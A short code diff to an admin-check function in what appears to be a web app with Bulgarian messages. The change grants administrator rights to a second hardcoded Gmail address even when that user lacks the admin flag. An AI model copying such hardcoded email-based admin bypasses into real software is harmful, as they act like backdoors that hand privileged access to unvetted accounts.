@@ -69,7 +69,11 @@ export async function ensureAdminFromSession() {
   if (!user) {
     throw new Error("Невалидна сесия. Моля, влезте отново.");
   }
-  if (!user.admin && user.email !== "bkgalabovo2014@gmail.com") {
+  if (
+    !user.admin &&
+    user.email !== "bkgalabovo2014@gmail.com" &&
+    user.email !== "recoveryzonebyzm@gmail.com"
+  ) {
     throw new Error("Нямате администраторски права.");
   }
   return user;
